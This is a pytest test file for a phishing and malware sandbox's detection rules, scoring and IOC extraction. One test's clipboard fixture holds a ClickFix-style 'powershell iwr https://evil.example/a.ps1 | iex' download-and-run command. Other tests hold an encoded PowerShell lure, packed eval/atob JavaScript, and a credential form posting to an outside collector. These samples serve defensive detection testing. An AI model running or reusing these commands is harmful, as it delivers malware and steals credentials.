"""Behaviour rules, facts, scoring and IOC extraction against stored captures (ANA-4,
ANA-7, ANA-9, section 11 fixture-based tests).

``tests/fixtures/captures/phish_chain`` is a real capture of ``tests/fixtures/site``: a
meta-refresh to a Microsoft-themed login form posting to another domain, a popup, a
ClickFix clipboard lure with internal-address probes, and an automatic .exe download.
"""

from pathlib import Path

import pytest

from sandbox.analysis.domains import BrandRef, lookalike, registrable, skeleton
from sandbox.analysis.engine import behaviour_hits, evaluate
from sandbox.analysis.facts import CaptureData, build_facts, extract_iocs
from sandbox.analysis.local import builtin_behaviour, evaluate_dir
from sandbox.analysis.scoring import score
from sandbox.rules import defaults

CAPTURE = Path(__file__).parent / "fixtures" / "captures" / "phish_chain"
BRANDS = [BrandRef(n, tuple(k), tuple(d)) for n, k, d in defaults.DEFAULT_BRANDS]


@pytest.fixture(scope="module")
def fixture_eval():
    return evaluate_dir(CAPTURE)


def _rules(ev) -> set[str]:
    return {h["rule_name"] for h in ev.rule_hits}


def test_fixture_capture_is_malicious(fixture_eval):
    assert fixture_eval.result.verdict == "malicious"
    assert fixture_eval.result.score == 100
    assert {"phishing", "clickfix", "malware-download", "internal-probe"} <= set(fixture_eval.tags)


@pytest.mark.parametrize(
    "rule",
    [
        "form_posts_cross_domain",
        "automatic_download",
        "executable_download",
        "clickfix_clipboard_command",
        "brand_impersonation",
        "internal_network_probe",
        "password_over_http",
        # YARA, built-in set
        "clickfix_powershell_lure",
        "js_eval_decoded_payload",
        "html_smuggling_blob_download",
    ],
)
def test_fixture_triggers(fixture_eval, rule):
    assert rule in _rules(fixture_eval)


@pytest.mark.parametrize(
    "rule", ["phishkit_credential_exfil", "lookalike_domain", "punycode_domain"]
)
def test_fixture_does_not_trigger(fixture_eval, rule):
    assert rule not in _rules(fixture_eval)


def test_fixture_facts_explain_hits(fixture_eval):
    facts = fixture_eval.facts
    form = facts["forms"]["cross_domain_credential_forms"][0]
    assert form["action"] == "https://collector.example.net/submit.php"
    assert facts["brand"]["name"] == "Microsoft"
    assert "powershell" in facts["clipboard"]["commands"][0]["text"]
    assert facts["downloads"]["files"][0]["name"] == "invoice_2026.exe"
    assert {r["type"] for r in facts["redirects"]["chain"]} == {"meta_refresh", "js"}
    hit = next(h for h in fixture_eval.rule_hits if h["rule_name"] == "form_posts_cross_domain")
    assert "forms.cross_domain_credential_forms" in hit["detail"]["facts"]


def test_fixture_iocs(fixture_eval):
    iocs = fixture_eval.iocs
    assert "https://collector.example.net/submit.php" in iocs["urls"]
    assert len(iocs["hashes"]) == 2  # sha256 and md5 of the download


# --- synthetic captures for rules the fixture does not exercise -----------------------


def _data(**result) -> CaptureData:
    base = {
        "url": "https://start.example/",
        "final_url": "https://start.example/",
        "pages": [],
        "redirects": [],
        "navigations": [{"url": "https://start.example/"}],
        "hosts": {},
    }
    return CaptureData(result={**base, **result}, brands=BRANDS)


def _hits(data: CaptureData) -> set[str]:
    return {h["rule_name"] for h in behaviour_hits(builtin_behaviour(), build_facts(data))}


def test_obfuscated_javascript():
    data = _data()
    data.scripts = {
        "abc": "eval(function(p,a,c,k,e,d){return p}('x',1,1,'x'.split('|'),0,{}))"
        "; eval(atob('YWxlcnQoMSk='))"
    }
    assert "obfuscated_javascript" in _hits(data)


def test_plain_script_is_not_obfuscated():
    data = _data()
    data.scripts = {"abc": "document.getElementById('x').addEventListener('click', go);"}
    assert "obfuscated_javascript" not in _hits(data)


def test_newly_registered_domain():
    data = _data()
    data.domain_ages = {"start.example": 3, "old.example": 4000}
    assert "newly_registered_domain" in _hits(data)
    data.domain_ages = {"start.example": 400}
    assert "newly_registered_domain" not in _hits(data)


def test_punycode_domain():
    data = _data(final_url="https://xn--pypal-4ve.com/login")
    assert "punycode_domain" in _hits(data)


@pytest.mark.parametrize(
    ("host", "kind"),
    [
        ("paypa1.com", "homoglyph"),
        ("rnicrosoft.com", "homoglyph"),
        ("amazom.com", "typo"),
        ("paypal.secure-login.xyz", "combo"),
        ("microsoft-office365-login.com", "combo"),
    ],
)
def test_lookalike_detected(host, kind):
    found = lookalike(host, BRANDS, set())
    assert found is not None and found["kind"] == kind


@pytest.mark.parametrize(
    "host",
    [
        "paypal.com",
        "login.microsoftonline.com",
        "purchase-orders.com",
        "pineapple.com",
        "five.com",
        "example.org",
    ],
)
def test_lookalike_not_detected(host):
    assert lookalike(host, BRANDS, set()) is None


def test_lookalike_rule():
    data = _data(final_url="https://paypa1.com/signin")
    assert "lookalike_domain" in _hits(data)


def test_suspicious_redirect_chain():
    hops = [
        {"from": f"https://h{i}.example/", "to": f"https://h{i + 1}.test/", "type": "http_302"}
        for i in range(4)
    ]
    assert "suspicious_redirect_chain" in _hits(_data(redirects=hops))
    downgrade = [{"from": "https://a.example/", "to": "http://a.example/x", "type": "http_301"}]
    assert "suspicious_redirect_chain" in _hits(_data(redirects=downgrade))
    assert "suspicious_redirect_chain" not in _hits(_data(redirects=downgrade[:0]))


def test_analyst_navigation_is_not_a_suspicious_redirect():
    """The youtube.com case: the analyst browsed elsewhere during an interactive session."""
    hops = [
        {
            "from": "https://youtube.com/",
            "to": "https://www.youtube.com/",
            "type": "http_301",
            "page": "p0",
        },
        {
            "from": "https://google.com/",
            "to": "https://www.google.com/",
            "type": "http_301",
            "page": "p1",
        },
        {
            "from": "https://www.google.com/",
            "to": "https://www.google.com/search?btnI=1",
            "type": "form",
            "page": "p1",
        },
        {
            "from": "https://www.google.com/search?btnI=1",
            "to": "https://doodles.google/",
            "type": "http_302",
            "page": "p1",
        },
        {"from": "https://doodles.google/", "to": "https://x.example/", "type": "js", "page": "p0"},
    ]
    times = ["10:00:01", "10:00:30", "10:00:40", "10:00:40", "10:00:50"]
    events = [
        {"ts": f"2026-10-10T{t}+00:00", "kind": "redirect", "source": "network", "payload": h}
        for t, h in zip(times, hops, strict=True)
    ]
    events += [
        {
            "ts": "2026-10-10T10:00:29+00:00",
            "kind": "popup",
            "source": "browser",
            "payload": {"page": "p1", "opener": None},
        },
        {"ts": "2026-10-10T10:00:49+00:00", "kind": "click", "source": "analyst", "payload": {}},
    ]
    data = _data(
        url="https://youtube.com/",
        final_url="https://www.youtube.com/",
        interactive=True,
        redirects=hops,
    )
    data.events = events
    facts = build_facts(data)["redirects"]
    assert [h["to"] for h in facts["chain"]] == ["https://www.youtube.com/"]
    assert len(facts["analyst_navigations"]) == 4
    assert "suspicious_redirect_chain" not in _hits(data)

    data.result["interactive"] = False  # automated: there is no analyst, everything counts
    assert build_facts(data)["redirects"]["count"] == 5


def test_hidden_iframe_ignores_blank_same_site_and_allowlisted():
    page = {
        "frames": [
            {
                "url": "https://www.youtube.com/",
                "iframes": [
                    {"src": None, "hidden": True},
                    {"src": "about:blank", "hidden": True},
                    {"src": "https://accounts.google.com/ServiceLogin", "hidden": True},
                    {"src": "https://studio.youtube.com/x", "hidden": True},
                ],
            }
        ]
    }
    data = _data(pages=[page])
    data.allowlisted = {"google.com"}
    assert "hidden_iframe" not in _hits(data)


def test_hidden_iframe():
    page = {
        "frames": [
            {
                "url": "https://start.example/",
                "iframes": [{"src": "https://tracker.example/", "hidden": True}],
            }
        ]
    }
    assert "hidden_iframe" in _hits(_data(pages=[page]))


def test_brand_on_its_own_domain_is_not_impersonation():
    page = {
        "frames": [
            {
                "url": "https://login.microsoftonline.com/",
                "title": "Sign in to Microsoft",
                "text": "Microsoft Outlook",
                "forms": [
                    {
                        "action": "https://login.microsoftonline.com/x",
                        "fields": [{"type": "password"}],
                    }
                ],
            }
        ]
    }
    data = _data(final_url="https://login.microsoftonline.com/", pages=[page])
    assert "brand_impersonation" not in _hits(data)


def test_page_that_never_loaded_is_unknown_not_benign():
    data = _data(
        final_url="chrome-error://chromewebdata/",
        navigations=[{"url": "https://start.example/"}, {"url": "chrome-error://chromewebdata/"}],
    )
    ev = evaluate(
        data,
        behaviour=builtin_behaviour(),
        yara_hits=[],
        indicator_hits=[],
        suricata_alerts=[],
        weights={},
        thresholds={"suspicious": 30, "malicious": 70},
    )
    assert ev.facts["capture"]["load_failed"] is True
    assert ev.result.verdict == "unknown"


def test_prompted_download_is_not_automatic():
    data = _data(downloads=[{"sha256": "aa", "suggested_filename": "report.pdf"}])
    data.events = [
        {"ts": "2026-10-10T10:00:00+00:00", "kind": "click", "source": "analyst", "payload": {}},
        {
            "ts": "2026-10-10T10:00:02+00:00",
            "kind": "download",
            "source": "browser",
            "payload": {"sha256": "aa"},
        },
    ]
    hits = _hits(data)
    assert "automatic_download" not in hits
    assert "executable_download" not in hits


def test_benign_capture_scores_benign():
    page = {
        "frames": [
            {
                "url": "https://start.example/",
                "title": "Docs",
                "text": "Hello",
                "forms": [],
                "iframes": [],
            }
        ]
    }
    ev = evaluate(
        _data(pages=[page]),
        behaviour=builtin_behaviour(),
        yara_hits=[],
        indicator_hits=[],
        suricata_alerts=[],
        weights={},
        thresholds={"suspicious": 30, "malicious": 70},
    )
    assert ev.result.verdict == "benign"
    assert ev.result.score == 0


# --- scoring --------------------------------------------------------------------------


def _hit(name, severity="medium"):
    return {"rule_name": name, "engine": "behaviour", "severity": severity}


def test_score_uses_configured_weights_and_counts_rules_once():
    result = score(
        rule_hits=[_hit("a", "high"), _hit("a", "high"), _hit("b", "low")],
        indicator_hits=[],
        suricata_alerts=[],
        weights={"severity:high": (40, None), "b": (5, None)},
        thresholds={"suspicious": 30, "malicious": 70},
        allowlisted=set(),
        capture_ok=True,
    )
    assert result.score == 45
    assert result.verdict == "suspicious"
    assert [c.name for c in result.contributions] == ["a", "b"]


def test_allowlisted_indicator_weighs_less():
    hit = {
        "type": "domain",
        "matched_value": "cdn.example",
        "registrable": "cdn.example",
        "sources": [{"feed": "x", "confidence": 100}],
    }
    kwargs = dict(
        rule_hits=[],
        suricata_alerts=[],
        weights={"indicator": (60, None)},
        thresholds={"suspicious": 30, "malicious": 70},
        capture_ok=True,
    )
    assert score(indicator_hits=[hit], allowlisted=set(), **kwargs).score == 60
    assert score(indicator_hits=[hit], allowlisted={"cdn.example"}, **kwargs).score == 15


def test_failed_capture_without_hits_is_unknown():
    result = score(
        rule_hits=[],
        indicator_hits=[],
        suricata_alerts=[],
        weights={},
        thresholds={},
        allowlisted=set(),
        capture_ok=False,
    )
    assert result.verdict == "unknown"


def test_registrable_and_skeleton():
    assert registrable("a.b.example.co.uk") == "example.co.uk"
    assert registrable("10.0.0.1") == "10.0.0.1"
    assert skeleton("paypa1") == skeleton("paypal")


# --- new fact derivations (HAR, web3, idp, clipboard A1 fields) -----------------------


def _capd(final_url, **result):
    from sandbox.analysis.facts import CaptureData

    base = {
        "url": final_url,
        "final_url": final_url,
        "pages": [],
        "redirects": [],
        "navigations": [{"url": final_url}],
        "hosts": {},
    }  # noqa: E501
    return CaptureData(result={**base, **result}, brands=BRANDS)


def _harreq(url, method="GET", post="", body="", set_cookie=()):
    return {
        "request": {
            "method": method,
            "url": url,
            "headers": [],
            "postData": {"text": post} if post else {},
        },  # noqa: E501
        "response": {
            "status": 200,
            "content": {"text": body},
            "headers": [{"name": "set-cookie", "value": c} for c in set_cookie],
        },  # noqa: E501
    }


def test_facts_backward_compatible_with_old_capture():
    """A capture missing every new artifact yields neutral facts, never a crash."""
    facts = build_facts(_capd("https://plain.example/"))
    assert facts["exfil"]["telegram_count"] == 0
    assert facts["idp"]["ms_clone_pages"] == 0
    assert facts["web3"]["rpc_call_count"] == 0
    assert facts["websocket"]["count"] == 0
    assert facts["evasion"]["devtools_blocked"] == 0
    assert facts["final"]["ipfs"] is None
    assert facts["lure"]["fake_captcha"] is False


def test_web3_rpc_fact_parses_batch_and_method():
    data = _capd("https://x.example/")
    body = (
        '[{"jsonrpc":"2.0","method":"eth_call","params":[{"to":"0xABc"}]},'
        '{"jsonrpc":"2.0","method":"eth_getCode","params":["0x1"]}]'
    )
    data.har_entries = [_harreq("https://rpc.example/", "POST", post=body)]
    web3 = build_facts(data)["web3"]
    assert web3["rpc_call_count"] == 2
    assert "0xabc" in web3["contract_addresses"]


def test_clipboard_no_gesture_and_overwrite_facts():
    data = _capd(
        "https://x.example/",
        clipboard=[
            {
                "api": "navigator.clipboard.writeText",
                "text": "powershell -enc " + "A" * 60,
                "user_activation": False,
            },  # noqa: E501
            {"api": "navigator.clipboard.writeText", "text": "   ", "user_activation": True},
        ],
    )
    clip = build_facts(data)["clipboard"]
    assert clip["no_gesture_writes"] == 1
    assert clip["overwritten_command"] == 1


def test_clipboard_ioc_extraction_from_command():
    data = _capd(
        "https://x.example/",
        clipboard=[{"api": "x", "text": "powershell iwr https://evil.example/a.ps1 | iex"}],
    )
    iocs = extract_iocs(data, build_facts(data))
    assert "https://evil.example/a.ps1" in iocs["urls"]
    assert "evil.example" in iocs["domains"]


def test_magic_typing_detects_iso_in_download_head():
    from sandbox.analysis.facts import _magic_type

    head = b"\x00" * 0x8001 + b"CD001"
    assert _magic_type(head) == "iso"
    assert _magic_type(b"MSCF\x00") == "cab"


def test_not_applicable_suricata_alert_is_not_scored():
    alert = {"sid": 1, "signature": "Password sent unencrypted", "severity": 1}

    def run():
        return score(
            rule_hits=[],
            indicator_hits=[],
            suricata_alerts=[alert],
            weights={"suricata:alert": (20, 45)},
            thresholds={"malicious": 70, "suspicious": 30},
            allowlisted=False,
            capture_ok=True,
        )

    assert run().score == 20
    alert["not_applicable"] = "HTTPS on the wire"
    scored = run()
    assert scored.score == 0
    assert scored.contributions[0].detail["not_applicable"] == "HTTPS on the wire"
